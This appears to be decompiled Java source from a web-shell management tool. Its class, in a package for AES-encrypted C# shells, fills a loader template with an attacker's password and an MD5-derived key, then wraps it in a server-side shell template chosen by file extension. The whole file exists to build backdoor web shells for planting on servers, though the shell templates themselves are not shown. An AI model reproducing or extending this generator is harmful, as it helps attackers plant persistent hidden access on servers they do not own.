//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.csharpAes;

import java.io.InputStream;

import core.shellprocessor.StartProcessor;
import util.Log;
import util.functions;

class Generate {
    Generate() {
    }

    public static byte[] GenerateShellLoder(String templateName, String suffix, String pass, String secretKey) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + templateName);
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            String code2 = code.replace("{pass}", pass).replace("{secretKey}", functions.md5(secretKey).substring(0, 16));
            InputStream inputStream2 = Generate.class.getResourceAsStream("template/shell." + suffix);
            String template = new String(functions.readInputStream(inputStream2));
            inputStream2.close();
            data = template.replace("{code}", code2).getBytes();
            data= StartProcessor.process(data,suffix);
        } catch (Exception var10) {
            Log.error(var10);
        }

        return data;
    }
}
